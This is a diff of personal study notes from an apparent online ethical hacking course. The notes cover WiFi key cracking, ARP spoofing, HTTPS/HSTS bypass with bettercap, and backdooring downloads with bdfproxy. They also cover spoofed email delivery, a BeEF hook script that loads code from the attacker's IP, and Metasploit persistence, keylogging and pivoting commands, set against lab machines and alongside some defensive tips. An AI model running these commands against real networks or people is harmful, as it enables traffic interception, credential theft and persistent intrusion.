@@ -2,7 +2,108 @@ Ethical Hacking
 
 Link https://www.udemy.com/learn-ethical-hacking-from-scratch
 
-# Install Kali
+# SUMMARY
+
+1. Setup lab: Kali, network interface, monitor mode
+2. Access Phase - Gaining access to WIFI network
+        1. WEP
+
+                * busy network
+                              
+                        airodump-ng (capture a large number of packets and related IVs that are sent with the data)
+                        aircrack-ng (analyze capture IVS)
+
+                * idle network
+                        1. Force the router to generate new IVs via Fake Authentication
+
+                                                aireplay-ng --fakeauth
+
+                        2. Use an ARP request replay attack to generate new IVs
+
+                                                aireplay-ng --arpreplay
+
+        2. WPA (stronger encryption)
+                1. Use misconfigured WPS functionality
+                2. Crack encryption via handshake: capture handshake, wordlist attack that generate handshake from a list of word and compare each of them to real handshakes
+
+                                aircrack-ng
+
+3. Exploit phase - Post-connection attacks
+
+        1. Info gathering: ifconfig / netdiscover / nmap
+        2. MITM attacks
+                1. ARP Spoofing / Poisoning: meddle with ARP tables to trick access point and target that they are the target/access point
+                        1. use arpspoof
+                        2. use MITMf (no longer maintained) that allows to ARP spoof, sniff data, bypass HTTPS, DNS spoofing, inject code, capture screen ...
+                        3. use bettercap (current solution) that allows to ARP spoof, sniff data, bypass HTTPS/HSTS, DNS spoofing, inject code, capture screen ...
+                2. Fake Access Point
+        3. Server-side attacks: need to be MITM + hack devices via vulnerabilities
+                1. exploit misconfiguration: zenmap to get info on running programs and ports
+                2. exploit backdoors
+                        1. metasploit (framework) to carry out penetration testing (port scans, ...)
+
+                                        msfconsole -> use -> set -> exploit
+
+                        2. Nexpose (framework)
+                3. exploit code execution vulnerabilities: same as before + payload
+        4. Client-side attacks
+                1 Via File
+                        * Create undetectable backdoor: use Veil-evasion to create backdoor with meterpreter and reverse connection payload. Check way to migrate to more stable process and run backdoor as a service to maintain connection even after restart
+                        * Backdoor file that user will want: Au2Exe to generate script and right-to-left trick to backdoor any type of file
+                        * Deliver backdoored file
+                                1. Backdoor on the fly with BDFPROXY and MITM attack -> not really a client side attack as we need to be MITM
+                                2. Social engineering to impersonate contact and trick user to get a file and download backdoor
+                                        * Maltego (Information Gathering Tool) to gather info
+                                        * Spoof email via sendemail and sendgrid SMTP service
+                2. Via URL: BeEF (Framework) launch attacks on a hooked target via URL
+
+4. Post exploitation
+
+        1. meterpreter to control target
+        2. pivoting: using target to gain access to other devices => use Autoroute module from
+
+5. Website hacking                                        
+
+# List of programs
+
+* airodump-ng: get info on network, connected devices, capture packets
+* aircrack-ng: crack WEP password, crack WPA password via wordlist attack
+* aireplay-ng: fake authentication attack (--fakeauth), ARP request replay attack (--arpreplay)
+* netdiscover: map connected devices
+* nmap: map connected devices
+* arpspoof: simple arpspoof attack
+* MITMf (no longer maintained): framework that allows to ARP spoof, sniff data, bypass HTTPS, DNS spoofing, inject code, capture screen ...
+* bettercap (current solution): framework that allows to ARP spoof, sniff data, bypass HTTPS/HSTS, DNS spoofing, inject code, capture screen ...
+* zenmap: get info on running programs and ports
+* metasploit: framework to carry out penetration testing (port scans ) + GUI via Metasploit Community
+        * Autoroute: metasploit module that allows pivoting
+        * meterpreter: payload used to control target
+* Nexpose: similar to metasploit but list more vulnerabilities
+* Veil: framework used here for Evasion tool that allows to create backdoor with meterpreter and reverse connexion payload
+* Maltego: information gathering tool used in social engineering attacks
+* BeEF: framework that allows to launch attacks on a hooked target. A target is hooked when it loads a URL containing custom script
+* Xarp: allows to monitor ARP tables and detect ARP spoofing attacks
+
+# Lexicon
+
+* ARP: Address Resolution Protocol used to map IP with MAC addresses on a network (not very secure)
+* IV (Initialization Vector): used to generate key to encrypt data that is sent via WEP protocol
+* handshake: 4 packets sent when a client connects to an access point
+* backdoor: file that gives us full control over the machine that it gets executed on
+* Trojan: 2 parts -> file that the user want and backdoor
+* Pivoting: using a device as a pivot in ordered to attack and other device that is not readily visible to the hacker (on different network)
+
+# Protection against attacks
+
+* MITM:
+        * detecting: Xarp / manually check ARP table (arp -a) / Wireshark
+        * preventing: change ARP entry for the router from dynamic to static
+* backdoor: only download from HTTPS + check file MD5 after download
+* detecting trojans: check properties of a file / run the file on a virtual machine and check resources / use hybrid-analysis.com sandbox service
+
+# Setup Lab
+
+## Install Kali
 
 - Download Virtualbox
 - Download Kali prebuild image https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/ (ova extension)
@@ -14,17 +115,10 @@ Link https://www.udemy.com/learn-ethical-hacking-from-scratch
 - Connect to Kali (root / toor)
 - Take a snapshot: Tools > Snapshots > Take > Name / Description // Convenient if you mess something up or if you need to downgrade a library for example
 
-# Virtual Machine to attack
+## Virtual Machine to attack
 
 * Windows virtual machine
 * Metasploitable: vulnerable linux distro to test server attack, use the existing virtual disk downloaded (user and password msfadmin)
-
-# Network Hacking
-
-3 types:
-* Preconnection Attacks (even before connecting to anything)
-* Gaining Access (cracking wifi keys)
-* Post-connection Attacks
 
 ## How a network works
 
@@ -273,7 +367,7 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
         * ARP SPOOFFING ATTACKS: redirect flow of packets so it flows through attacker computers
         * FAKE ACCESS POINT (Honeypot)
 
-## ARP SPOOFING ATTACKS
+## ARP SPOOFING ATTACKS - ARP POISONNING
 
 ### ARP: Address Resolution Protocol
         * Not very secure
@@ -323,7 +417,7 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
 * The tool starts automatically a sniffer, that catches data that it is send by the devices. Try with vulnweb.com
 * NOTE: might need to deinstall and reinstall older version of Twisted library
 
-### Bypass HTTPS
+### Bypass HTTPS -> check version with bettercap (simpler)
 
 * Previous attack only work agains HTTP requests, because data in HTTP is sent as plain text. MITM can thus read and edit requests and responses
 * HTTPS encrypt HTTP using TLS (Transport Layer Security) or SSL (Secure Sockets Layer), very difficult to break
@@ -333,9 +427,9 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
 * Exception: website that use HSTS
         * HTTP Strict Transport Security
         * Used by Google, Facebook, Paypal ...
-        * Modern browsers are hard-coded to only load a list of HSTS websites over https => no practical method to bypass at the moment
+        * Modern browsers are hard-coded to only load a list of HSTS websites over https => no practical method to bypass at the moment (see below however :-) 
 
-### DNS spoofing
+### DNS spoofing -> check version with bettercap (simpler)
 
 * DNS (Domain Name System) is a server that translates domain names to IP addresses
 * As a Man in The Middle we can run a DNS server on our computer and redirect a user to another website
@@ -356,11 +450,11 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
 
         mitmf --arp --spoof -i eth0 --target 10.0.2.4 --gateway 10.0.2.1 --dns
 
-### Capturing screen of target and inject keylogger
+### Capturing screen of target and inject keylogger -> check version with bettercap (simpler)
 
         mitmf --arp --spoof -i eth0 --target 10.0.2.4 --gateway 10.0.2.1 --screen
 
-### Injecting custom JS or HTML code
+### Injecting custom JS or HTML code -> check version with bettercap (simpler)
 
         mitmf --arp --spoof -i eth0 --target 10.0.2.4 --gateway 10.0.2.1 --inject
 
@@ -374,24 +468,70 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
 * use the same way as before
 * Check if Kali machine is only connected with one interface (disconnect ethernet interface)
 
-## Using BETTERCAP to do the above more easily
-
-=> see lecture
-
-## Wireshark and use with mitmf
+## Wireshark and use with mitmf -> check version with bettercap (simpler)
 
 * Wireshark is a network protocol analyser
 * Designed to help network admin to keep track of what is happening in their network
 * It logs packets that flow through the selected interface and analyse all packets
 * It the case of a MITM attack, it only sniff packet that go through the attacker computer, not the network or the targeted machine itself
 
-### Analyse packets
+### Analyse packets -> check version with bettercap (simpler)
 
 * open file or click on interface to listen to packet
 * type "http" to filter http packets
 * to get form data, filter with http and look for POST request and then HTTP form info
 * Filter packet content via Edit > Find Packet > Packet Details > String
 * Filter cookies via http.cookie, then use the cookie info to log in
+
+### Use Bettercap for MITM attacks -> much easier
+
+* Bettercap is a framework to run network attacks, can be used to ARP Spoof targets (redirect flow of packets), Sniff Data (url, username, passwords), bypass HTTPS, redirect domain request (DNS spoofing), inject code in loaded pages
+
+                bettercap -iface <interface>
+                net.probe on => start net.probe module
+                net.recon on
+
+* First step: ARP Spoofing:
+
+                bettercap -iface <interface>
+                net.probe on
+                net.recon on
+                set arp.spoof.fullduplex true
+                set arp.spoof.targets <IP target>
+                arp.spoof on
+
+* Second step: Spying on network devices
+
+                net.sniff on
+
+* Custom script -> caplet file .cap
+
+                net.probe on
+                net.recon on
+                set arp.spoof.fullduplex true
+                set arp.spoof.targets <IP target>
+                arp.spoof on
+                net.sniff on
+
+                bettercap -iface <interface> -caplet <file.cap>
+
+* Bypass HTTPS with bettercap => use built-in caplet with modified version from udemy teacher + add "set net.sniff.local true" so the HTTPS bypass work (data will be seen as sent from our computer)
+
+                bettercap -iface <interface> -caplet /root/spoof.cap
+                caplets.show
+                hstshijack/hstshijack => launch the caplet within bettercap
+
+* Bypass HSTS: trick the browser into loading a different website => replace all links for HSTS websites with similar links, ex: facebook.com => facebook.corn
+        * same as above, the modified hstshijack code already contains code to modify website as said earlier
+        * hstshijack.cap => targets / replacement / dns spoof domains
+        * Strategy works only if the user goes to search engine (that do not use HSTS but HTTPS) to search for facebook.com and we modify all links to facebook.corn, then the connection is downgraded to HTTP
+
+* Using a graphical GUI
+
+                bettercap -iface <interface>
+                set ui.basepath /usr/share/bettercap
+                ui update
+                http-ui (user/pass)
 
 ## FAKE ACCESS POINT
 
@@ -432,7 +572,7 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
                 * Require user interaction, such as opening a file, a link
                 * Info gathering is key here, create a trojan, use social engineering to get the target to run it
 
-## Server Side Attacks
+## Server Side Attacks -> use mitm position to hack data flow via vulnerabilities
 
 * try default password (ssh iPad case)
 * Services might be misconfigured such as the r service, ports 512, 513, 514
@@ -473,7 +613,7 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
                 cd /opt/rapid7/nexpose/nsc
                 ./nsc.sh
 
-# Client Side Attacks
+# Client Side Attacks -> deliver and use a backdoor
 
 * Use if server side attacks fails
 * If IP is probably useless (different network, hidden behind a router, ...)
@@ -541,18 +681,148 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
 
 * Backdooring downloads on the fly via BDFPROXY- backdoor any exe that the target downloads
 
-                //Set IP addres in config
+                //Download, configure and start bdfproxy
                 Install bdfproxy
                 leafpad /etc/bdfproxy/bdfproxy.cfg
+                => set IP address and proxyMode to transparent
                 bdfproxy => start program
                 
                 //Rediret traffic to bdfproxy
                 iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 8080
 
+                //Start arp spoofing
+                mitmf --arp --spoof-i <interface> --gateway <gateway IP> --targets <target IP>
+                or bettercap
+
                 //Start listening for connections
                 msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc
 
-                //Start arp spoofing
-                mitmf --arp --spoof-i <interface> --gateway <gateway IP> --targets <target IP>
-
                 // When done reset ip table rules
+
+### Protect yourself
+
+* Ensure you're not being MITM'ed => trusted networks only, use xarp
+* Only download from HTTPS
+* Check file MD5 after download => www.winmd5.com
+
+## Client side attacks - Social Engineering
+
+* Main problem with server side attacks => we need to be the man in the middle
+* Client side attacks start with gathering infos about the user and then build a strategy and a backdoor based on the info
+* The strategy can be to impersonate a friend and send a request via mail or other means to open a file
+
+### Maltego
+
+* Maltego is an information gathering tool that can be used to collect info about ANYTHING (website, company, person, ...).
+* Discover entities associated with target
+* Display info on a graph
+* You can via Transform:
+        * Discovering websites,Links and social networking accounts associated with target
+        * Discovering Twitter friends & Associated accounts
+        * Discovering Emails of the target's friends
+        * Analyzing the Gathered Info & Building an attack strategy
+
+### Backdooring any file type (images, pdfs, ...)
+
+* Custom Au2Exe script, see udemy for source code
+* Compile the script => .txt => .au3
+* Changing Trojan's icon
+* Spoof .exe extension => use a right to left character + add to archive to overpass browser protection
+* Start handler (see above)
+
+### Delivery - Spoofing emails
+
+* setting up an SMTP server to bypass mailbox security => SendGrid
+* Sending emails as any email account
+                
+                sendemail -s smtp.sengrind.net:25 -xu <user> -xp <password> -f "m.asker@isecurity.org" -t "zaid@isecurity.org" -u <subject> -m <message body with link> -o message-header="From:<name>"
+
+### BeEF
+
+* Browser Exploitation Framework allows us to launch a number of attacks on a hooked target.
+* A target is hooked once they load a hook URL (actually a script need to be launched), several method to deliver the URL
+        * DNS spoof requests to a page containing the hook
+        * Inject the hook in browsed pages (need to be MITM)
+        * Use XSS exploit
+        * Social engineer the target to open a hook page
+
+* Script to hook any page
+
+                var imported = document.createElement('script);
+                imported.src = 'http://YourIp:3000/hook.js';
+                document.head.appendChild(imported);
+
+* Running basic commands on target: alert box, raw javascript, screenshot, webcam, redirect ...
+* Stealing credentials/ passwords using a fake login prompt (with proper CSS)
+* Gaining full control over windows target: notification bar
+
+### Detecting Trojans manually
+
+* Trojans / backdoors have two parts: the first runs in the background and run the code (open a port, give us a connection ...), the second runs a code that the user expect (play an MP3, download a file, ...)
+* To detect a Trojan:
+        * Check properties of the file
+        * Run the file in a virtual machine and check resources
+        * Use an online sandbox service: https://www.hybrid-analysis.com
+
+## Gaining access outside the local network
+
+* Need to configure router to allow incoming connection and redirect them to the Kali machine
+=> see Udemy lectures fo details
+
+# Post-Exploitation
+
+## Meterpreter
+
+                background => "minimize" the session while maintening connection
+                sessions -l => list all sessions
+                sessions -i <id> => connect to the session
+                sysinfo => get info on system
+                ipconfig => list internet interfaces
+                ps => list all processes
+                migrate <id of process> => move our current session to another program (that is less likely to be terminated, be careful of the port used 8080 that will show in the Resource Manager)
+
+* File System Commands are linux commands (pwd, ls, cat, ...) + download / upload / execute
+
+## Maintaining Access
+
+* in case the target person uninstal the vulnerable program or if they restart their computer
+1 Migrate the backdoor to a more "stable" process (explorer, browser)
+2 Using a veil-evasion (use it instead of a normal backdoor or uplad and execute from meterpreter) -> does not always work
+3 Using persistence module -> detectable by antivirus program
+4 Using metasploit + veil-evasion -> more robust + undetectable by antivirus / use normal backdoor and run as a service
+
+                use exploit/windows/local/persistence
+                set session <session id>
+                set exe::custom <backdoor location>
+                exploit
+
+## Spying (keylogger)
+
+* in meterpreter => keyscan_start / keyscan_dump (show data) / keyscan_stop
+
+## Pivoting
+
+* Use the hacked device as a pivot to gain access to other devices in the network, that are not readily visible to the hacker
+* Use Autoroute
+        * Setup a route between hacker and hacked device
+        * Gives hacker access to devices on the network
+        * Use metasploit
+
+                        use post/windows/manage/autoroute
+                        set SUBNET <subnet> => the other subnet used by the pivot
+                        set SESSION <id> => link with the session used to connect to the pivot
+                        exploit
+
+        * Then able to run any exploit
+
+# Website Hacking
+
+## Information Gathering
+
+## File Upload, Code Execution, File Inclusion Vulns
+
+## SQL Injection Vulnerabilities
+
+## Cross Site Scripting Vulnerabilities
+
+## Discovering Vulnerabilities automatically using OWASP ZAP
